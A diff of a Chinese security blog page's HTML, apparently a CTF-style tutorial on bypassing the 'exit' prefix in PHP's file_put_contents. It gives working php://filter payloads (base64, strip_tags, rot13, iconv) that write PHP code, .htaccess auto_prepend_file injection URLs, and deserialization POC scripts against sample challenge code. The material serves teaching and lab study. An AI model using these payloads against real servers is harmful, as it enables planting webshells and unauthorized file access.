+<img src="/2020/09/30/file_put_contents/20201010141634.png" alt></p>
 <p>将 ?&gt;PD9waHAgcGhwaW5mbygpOz8+ 作为目录名，无论存在不存在，再利用 <code>../</code> 回退到原目录，这样创建出来的文件名就正常了。</p>
 <p>为什么无法再 windows 下利用呢，主要原因是因为 windows 不支持文件名中有 <code>? &gt;</code> 这样的字符。</p>
-<p><strong><em>②</em></strong> (改头换面)<br><code>$content="php://filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../whippet.php";</code></p>
-<p>按照某篇文章所描述来讲，这个 payload 利用成功的原因是首先会根据 <code>strip_tags</code> 将<br><code>&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;</code> 部分删去，然后将剩余的部分 <code>base64-decode</code>。然而经过测试，这样的 payload 也是可以成功的。  </p>
-<p><code>$content="php://filter/A|&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../whippet.php";</code><br>所以描述的应该并不正确，应该是类似开启了贪婪模式，直接从最前面的一个 <code>&lt;?</code> 匹配至最后面的 <code>?&gt;</code> 把这些全部删除。然后再将剩余的部分进行 base64解码。</p>
+<p><em><strong>②</strong></em> (改头换面)<br>
+<code>$content="php://filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../whippet.php";</code></p>
+<p>按照某篇文章所描述来讲，这个 payload 利用成功的原因是首先会根据 <code>strip_tags</code> 将<br>
+<code>&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;</code> 部分删去，然后将剩余的部分 <code>base64-decode</code>。然而经过测试，这样的 payload 也是可以成功的。</p>
+<p><code>$content="php://filter/A|&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../whippet.php";</code><br>
+所以描述的应该并不正确，应该是类似开启了贪婪模式，直接从最前面的一个 <code>&lt;?</code> 匹配至最后面的 <code>?&gt;</code> 把这些全部删除。然后再将剩余的部分进行 base64解码。</p>
 <p>但是针对于 <code>file_put_contents(\$content,"&lt;?php exit();?&gt;".$content);</code> 情况时，前面的 <code>&lt;?</code> 已经闭合，为了满足后面的闭合，所以必须要添加这个无效的过滤器。</p>
 
         <h3 id="0x05-htaccess的预包含利用">
           <a href="#0x05-htaccess的预包含利用" class="heading-link"><i class="fas fa-link"></i></a>0x05 .htaccess的预包含利用</h3>
-      <p><code>http://192.168.176.128/?content=php://filter/string.strip_tags/?%3Ephp_value%20auto_prepend_file%20flag%20%0a%23/resource=.htaccess</code></p>
-<p><img src="/2020/09/30/file_put_contents/20201010164929.png"><br><img src="/2020/09/30/file_put_contents/20201010164841.png"></p>
+      
+<p><code>http://192.168.176.128/?content=php://filter/string.strip_tags/?%3Ephp_value%20auto_prepend_file%20flag%20%0a%23/resource=.htaccess</code></p>
+<p><img src="/2020/09/30/file_put_contents/20201010164929.png" alt><br>
+<img src="/2020/09/30/file_put_contents/20201010164841.png" alt></p>
 <p>利用 <code>%0a</code> 进行换行 <code>#</code> 注释后面的杂糅代码</p>
 
         <h2 id="file-put-contents-filename-content-“-nxxxxxx”">
           <a href="#file-put-contents-filename-content-“-nxxxxxx”" class="heading-link"><i class="fas fa-link"></i></a>file_put_contents($filename,$content . “\nxxxxxx”);</h2>
-      <p>这种情况较为简单，仅仅需要让后面的杂糅代码被注释掉就就可以，针对 php 而言，拥有特殊的起始符和结束符，如果可以写入 php 代码的话，就可以轻易的绕过后面的杂糅代码。<br><img src="/2020/09/30/file_put_contents/20201010153809.png"></p>
+      
+<p>这种情况较为简单，仅仅需要让后面的杂糅代码被注释掉就就可以，针对 php 而言，拥有特殊的起始符和结束符，如果可以写入 php 代码的话，就可以轻易的绕过后面的杂糅代码。<br>
+<img src="/2020/09/30/file_put_contents/20201010153809.png" alt></p>
 <p>但是在禁止使用拥有特殊起始符和结束符号的语言时，需要想办法处理掉杂糅的代码。通常利用 <code>.htaccess</code> 进行操作。</p>
 <p><code>http://192.168.176.128/?filename=.htaccess&amp;content=php_value%20auto_prepend_file%20flag%20%0a%23\</code></p>
-<p><img src="/2020/09/30/file_put_contents/20201010170246.png"><br><img src="/2020/09/30/file_put_contents/20201010170200.png"></p>
+<p><img src="/2020/09/30/file_put_contents/20201010170246.png" alt><br>
+<img src="/2020/09/30/file_put_contents/20201010170200.png" alt></p>
 <p>利用 <code>%0a</code> 进行换行 <code>#\</code> 注释后面的杂糅代码。</p>
 
         <h2 id="CTF-例题一">
           <a href="#CTF-例题一" class="heading-link"><i class="fas fa-link"></i></a>CTF 例题一</h2>
-      <figure class="highlight php"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>{ </span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $text;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data</span>) </span>{</span><br><span class="line">        <span class="keyword">return</span> unserialize($data);     </span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>{</span><br><span class="line">        $d   = <span class="string">'&lt;?php die("nononon");?&gt;'</span>;</span><br><span class="line">        $a= $d. <span class="keyword">$this</span>-&gt;text;</span><br><span class="line">        $file = <span class="keyword">$this</span>-&gt;file;</span><br><span class="line">        @file_put_contents($file, $a);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>{ </span><br><span class="line">        <span class="keyword">$this</span>-&gt;hasaki(); </span><br><span class="line">      } </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$data = <span class="string">""</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])){ </span><br><span class="line">  $data = $_POST[<span class="string">'data'</span>]; </span><br><span class="line">  <span class="keyword">new</span> Yongen($data); </span><br><span class="line">} </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></div></figure>
-<p>这是一道比较典型的 php 反序列化，其中 <code>$this -&gt; file = $file;</code> &amp; <code>$this -&gt; text = $text;</code> 可控，同时  <code>@file_put_contents($this-&gt; file,$a);</code> 会以 <code>$file</code> 为文件名，<code>&lt;?php die("nononon");?&gt;+$text</code>  为文件内容，生成一个文件。此处也是要想办法绕过死亡die()<br><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 一文中描述了三种方法。</p>
+      
+<figure class="highlight php"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>{ </span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $text;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data</span>) </span>{</span><br><span class="line">        <span class="keyword">return</span> unserialize($data);     </span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>{</span><br><span class="line">        $d   = <span class="string">'&lt;?php die("nononon");?&gt;'</span>;</span><br><span class="line">        $a= $d. <span class="keyword">$this</span>-&gt;text;</span><br><span class="line">        $file = <span class="keyword">$this</span>-&gt;file;</span><br><span class="line">        @file_put_contents($file, $a);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>{ </span><br><span class="line">        <span class="keyword">$this</span>-&gt;hasaki(); </span><br><span class="line">      } </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$data = <span class="string">""</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])){ </span><br><span class="line">  $data = $_POST[<span class="string">'data'</span>]; </span><br><span class="line">  <span class="keyword">new</span> Yongen($data); </span><br><span class="line">} </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></div></figure>
+<p>这是一道比较典型的 php 反序列化，其中 <code>$this -&gt; file = $file;</code> &amp; <code>$this -&gt; text = $text;</code> 可控，同时  <code>@file_put_contents($this-&gt; file,$a);</code> 会以 <code>$file</code> 为文件名，<code>&lt;?php die("nononon");?&gt;+$text</code>  为文件内容，生成一个文件。此处也是要想办法绕过死亡die()<br>
+<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 一文中描述了三种方法。</p>
 
         <h3 id="巧用编码与解码">
           <a href="#巧用编码与解码" class="heading-link"><i class="fas fa-link"></i></a>巧用编码与解码</h3>
-      <p><code>$file</code> 可以控制协议，可以通过 <code>php://filter</code> 协议来施展魔法；使用 <code>php://filter</code> 的 <code>base64-decode</code> 方法，将 <code>$a</code> 解码，利用 php base64_decode 函数特性去除”死亡exit“。<br>base64 编码中仅仅包含64个可打印字符，php 在解码 base 64 时，遇到不在其中的字符时，会跳过这些字符，仅将合法的字符组成一个新的字符串进行解码。</p>
+      
+<p><code>$file</code> 可以控制协议，可以通过 <code>php://filter</code> 协议来施展魔法；使用 <code>php://filter</code> 的 <code>base64-decode</code> 方法，将 <code>$a</code> 解码，利用 php base64_decode 函数特性去除”死亡exit“。<br>
+base64 编码中仅仅包含64个可打印字符，php 在解码 base 64 时，遇到不在其中的字符时，会跳过这些字符，仅将合法的字符组成一个新的字符串进行解码。</p>
 <figure class="highlight php"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_GET[<span class="string">'txt'</span>] = preg_replace(<span class="string">'|[^a-z0-9A-Z+/]|s'</span>, <span class="string">''</span>, $_GET[<span class="string">'txt'</span>]);</span><br><span class="line">base64_decode($_GET[<span class="string">'txt'</span>]);</span><br></pre></td></tr></tbody></table></div></figure>
-<p>所以，当 <code>$a</code> 被加上 <code>&lt;?php die("nononon");?&gt;</code> 以后，我们可以使用 <code>php://filter/write=convert.base64-decode</code> 来对其进行解码。在解码的过程中，字符 <code>&lt;、?、(、)、;、&gt;</code> 空格 等不符合 base64 编码的字符范围的将被忽略，所以最终被解码的字符仅有 <code>phpdienononon</code> 和其他传入的字符。<br><code>phpdienononon</code> 一共是13个字符，因为 base64 算法解码是4个 byte 一组，所以给他增加三个 <code>a</code> 一共十六个字符，这样前面的字符串会被正常的解析，后面我们传入的 webshell 的 base64 也会被正常的解码。结果就是 <code>&lt;?php die("nononon");?&gt;</code> 没有了。<br>POC</p>
+<p>所以，当 <code>$a</code> 被加上 <code>&lt;?php die("nononon");?&gt;</code> 以后，我们可以使用 <code>php://filter/write=convert.base64-decode</code> 来对其进行解码。在解码的过程中，字符 <code>&lt;、?、(、)、;、&gt;</code> 空格 等不符合 base64 编码的字符范围的将被忽略，所以最终被解码的字符仅有 <code>phpdienononon</code> 和其他传入的字符。<br>
+<code>phpdienononon</code> 一共是13个字符，因为 base64 算法解码是4个 byte 一组，所以给他增加三个 <code>a</code> 一共十六个字符，这样前面的字符串会被正常的解析，后面我们传入的 webshell 的 base64 也会被正常的解码。结果就是 <code>&lt;?php die("nononon");?&gt;</code> 没有了。<br>
+POC</p>
 <figure class="highlight php"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>{</span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">'php://filter/write=convert.base64-decode/resource=cccc.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> $text= <span class="string">'aaaPD9waHAgcGhwaW5mbygpOyA/Pg=='</span>;</span><br><span class="line">}</span><br><span class="line">$data = <span class="keyword">new</span> Yongen();</span><br><span class="line"><span class="keyword">print</span>(serialize($data));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></div></figure>
-<p><img src="/2020/09/30/file_put_contents/20200930123844.png"></p>
+<p><img src="/2020/09/30/file_put_contents/20200930123844.png" alt></p>
 
         <h3 id="利用字符串操作方法">
           <a href="#利用字符串操作方法" class="heading-link"><i class="fas fa-link"></i></a>利用字符串操作方法</h3>
-      <p><code>&lt;?php die("nononon");?&gt;</code> 本质上是一个 XML 标签，可以利用 <code>strip_tags</code> 函数去除， <code>php://filter</code> 也是支持这个方法的。<code>php://filter/write=strip_tags</code><br>但是把原本存在的 <code>&lt;?php die("nononon");?&gt;</code> 去除之后，我们再写入 webshell 也会被删除。 <code>php://filter</code> 是允许使用多个过滤器的，我们可以将 webshell 进行 base64 编码。在调用 <code>strip_tags</code> 之后再进行 <code>base64-decode</code>。</p>
+      
+<p><code>&lt;?php die("nononon");?&gt;</code> 本质上是一个 XML 标签，可以利用 <code>strip_tags</code> 函数去除， <code>php://filter</code> 也是支持这个方法的。<code>php://filter/write=strip_tags</code><br>
+但是把原本存在的 <code>&lt;?php die("nononon");?&gt;</code> 去除之后，我们再写入 webshell 也会被删除。 <code>php://filter</code> 是允许使用多个过滤器的，我们可以将 webshell 进行 base64 编码。在调用 <code>strip_tags</code> 之后再进行 <code>base64-decode</code>。</p>
 <p>POC</p>
 <figure class="highlight php"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>{</span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">'php://filter/write=string.strip_tags|convert.base64-decode/resource=dddd.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> $text= <span class="string">'PD9waHAgcGhwaW5mbygpOyA/Pg=='</span>;</span><br><span class="line">}</span><br><span class="line">$data = <span class="keyword">new</span> Yongen();</span><br><span class="line"><span class="keyword">print</span>(serialize($data));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></div></figure>
-<p><img src="/2020/09/30/file_put_contents/20200930133405.png"></p>
+<p><img src="/2020/09/30/file_put_contents/20200930133405.png" alt></p>
 
         <h3 id="rot13编码">
           <a href="#rot13编码" class="heading-link"><i class="fas fa-link"></i></a>rot13编码</h3>
-      <p><code>&lt;?php exit; ?&gt;</code> 在经过 rot13 编码之后会变成 <code>&lt;?cuc rkvg; ?&gt;</code><br><code>&lt;?cuc qvr("abababa");?&gt;</code> 在经过 rot13 编码之后会变成 <code>&lt;?cuc qvr("abababa");?&gt;</code><br>在 php 不开启 <code>short_open_tag</code> 短标签时，php 无法识别这个字符串。</p>
+      
+<p><code>&lt;?php exit; ?&gt;</code> 在经过 rot13 编码之后会变成 <code>&lt;?cuc rkvg; ?&gt;</code><br>
+<code>&lt;?cuc qvr("abababa");?&gt;</code> 在经过 rot13 编码之后会变成 <code>&lt;?cuc qvr("abababa");?&gt;</code><br>
+在 php 不开启 <code>short_open_tag</code> 短标签时，php 无法识别这个字符串。</p>
 <p>POC</p>
 <figure class="highlight php"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>{</span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">'php://filter/write=string.rot13/resource=eeee.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> $text= <span class="string">'&lt;?cuc cucvasb(); ?&gt;'</span>;</span><br><span class="line">}</span><br><span class="line">$data = <span class="keyword">new</span> Yongen();</span><br><span class="line"><span class="keyword">print</span>(serialize($data));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></div></figure>
-<p><img src="/2020/09/30/file_put_contents/20200930135043.png"></p>
+<p><img src="/2020/09/30/file_put_contents/20200930135043.png" alt></p>
 
         <h2 id="CTF-例题二">
           <a href="#CTF-例题二" class="heading-link"><i class="fas fa-link"></i></a>CTF 例题二</h2>
-      <p>关于跳出死亡 exit() 还有一个类似的例子。</p>
+      
+<p>关于跳出死亡 exit() 还有一个类似的例子。</p>
 <figure class="highlight php"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    show_source(<span class="string">'index.php'</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getKey</span>(<span class="params">$path</span>)</span>{</span><br><span class="line">        $name = $path.md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]).<span class="string">'.php'</span>;</span><br><span class="line">        <span class="keyword">return</span> $name;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">    $expire = $_POST[<span class="string">'expire'</span>];</span><br><span class="line">    $path = $_POST[<span class="string">'path'</span>];</span><br><span class="line">    $filename = getKey($path);</span><br><span class="line">    $value = $filename;</span><br><span class="line">    $data = serialize($value);</span><br><span class="line">    $data   = <span class="string">"&lt;?php\n//"</span> . sprintf(<span class="string">'%012d'</span>, $expire) . <span class="string">"\n exit();?&gt;\n"</span> . $data;</span><br><span class="line">    $result = file_put_contents($filename, $data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></div></figure>
-<p>我们可以注意到关键的部分位于  </p>
+<p>我们可以注意到关键的部分位于</p>
 <figure class="highlight php"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$data   = <span class="string">"&lt;?php\n//"</span> . sprintf(<span class="string">'%012d'</span>, $expire) . <span class="string">"\n exit();?&gt;\n"</span> . $data;</span><br><span class="line">$result = file_put_contents($filename, $data);</span><br></pre></td></tr></tbody></table></div></figure>
-<p><img src="/2020/09/30/file_put_contents/20200930101343.png"></p>
+<p><img src="/2020/09/30/file_put_contents/20200930101343.png" alt></p>
 <p><code>sprintf('%012d', $expire)</code>，会返回12位的数字字符串，与 <code>exit();?&gt;</code> 拼接形成一段 php 代码。 由于 exit 的存在，正常情况下程序不会执行到 exit() 后面的内容。要想办法跳出死亡 exit()。</p>
-<p>POST <code>path=php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?|/resource=whippet</code><br><img src="/2020/09/30/file_put_contents/20201010171158.png"></p>
+<p>POST <code>path=php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?|/resource=whippet</code><br>
+<img src="/2020/09/30/file_put_contents/20201010171158.png" alt></p>
 
         <h2 id="参考文章">
           <a href="#参考文章" class="heading-link"><i class="fas fa-link"></i></a>参考文章</h2>
-      <p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/">关于file_put_contents的一些小测试</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163">file_put_content和死亡·杂糅代码之缘</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202510">探索php://filter在实战当中的奇技淫巧</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>  </p>
+      
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/">关于file_put_contents的一些小测试</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>
+<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163">file_put_content和死亡·杂糅代码之缘</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>
+<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202510">探索php://filter在实战当中的奇技淫巧</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -253,16 +297,16 @@ FcgidWrapper "C:/Windows/System32/cmd.exe /c start cmd.exe" .abc</code></pre>
             document.body.appendChild(img);
           });
       </script></div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2020/09/27/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E(CVE-2020-25540)/"><span class="paginator-prev__text">Thinkadmin v6任意文件读取漏洞(CVE-2020-25540)</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">
-          前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file-put-contents-filename-%E2%80%9D-lt-php-exit-%E2%80%9D-content"><span class="toc-number">2.</span> <span class="toc-text">
-          file_put_contents($filename,”&lt;?php exit();”.$content);</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-Base64%E7%BC%96%E7%A0%81"><span class="toc-number">2.1.</span> <span class="toc-text">
+          前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file-put-contents-filename-php-exit-content"><span class="toc-number">2.</span> <span class="toc-text">
+          file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-Base64%E7%BC%96%E7%A0%81"><span class="toc-number">2.1.</span> <span class="toc-text">
           0x01 Base64编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-Rot13%E7%BC%96%E7%A0%81"><span class="toc-number">2.2.</span> <span class="toc-text">
           0x02 Rot13编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-htaccess%E7%9A%84%E9%A2%84%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8"><span class="toc-number">2.3.</span> <span class="toc-text">
           0x03 .htaccess的预包含利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E8%BF%87%E6%BB%A4%E5%99%A8%E7%BC%96%E7%A0%81%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8"><span class="toc-number">2.4.</span> <span class="toc-text">
-          0x04 过滤器编码组合利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file-put-contents-content-%E2%80%9D-lt-php-exit-%E2%80%9D-content"><span class="toc-number">3.</span> <span class="toc-text">
-          file_put_contents($content,”&lt;?php exit();”.$content);</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-Base64%E7%BC%96%E7%A0%81-%E6%97%A0%E6%B3%95%E5%88%A9%E7%94%A8"><span class="toc-number">3.1.</span> <span class="toc-text">
-          0x01 Base64编码  (无法利用)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-Rot13%E7%BC%96%E7%A0%81-1"><span class="toc-number">3.2.</span> <span class="toc-text">
+          0x04 过滤器编码组合利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file-put-contents-content-php-exit-content"><span class="toc-number">3.</span> <span class="toc-text">
+          file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-Base64%E7%BC%96%E7%A0%81-%E6%97%A0%E6%B3%95%E5%88%A9%E7%94%A8"><span class="toc-number">3.1.</span> <span class="toc-text">
+          0x01 Base64编码  (无法利用)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-Rot13%E7%BC%96%E7%A0%81-2"><span class="toc-number">3.2.</span> <span class="toc-text">
           0x02 Rot13编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-iconv%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2"><span class="toc-number">3.3.</span> <span class="toc-text">
-          0x03 iconv字符编码转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E8%BF%87%E6%BB%A4%E5%99%A8%E7%BC%96%E7%A0%81%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8-1"><span class="toc-number">3.4.</span> <span class="toc-text">
+          0x03 iconv字符编码转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E8%BF%87%E6%BB%A4%E5%99%A8%E7%BC%96%E7%A0%81%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8-2"><span class="toc-number">3.4.</span> <span class="toc-text">
           0x04 过滤器编码组合利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-htaccess%E7%9A%84%E9%A2%84%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8"><span class="toc-number">3.5.</span> <span class="toc-text">
           0x05 .htaccess的预包含利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file-put-contents-filename-content-%E2%80%9C-nxxxxxx%E2%80%9D"><span class="toc-number">4.</span> <span class="toc-text">
           file_put_contents($filename,$content . “\nxxxxxx”);</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF-%E4%BE%8B%E9%A2%98%E4%B8%80"><span class="toc-number">5.</span> <span class="toc-text">
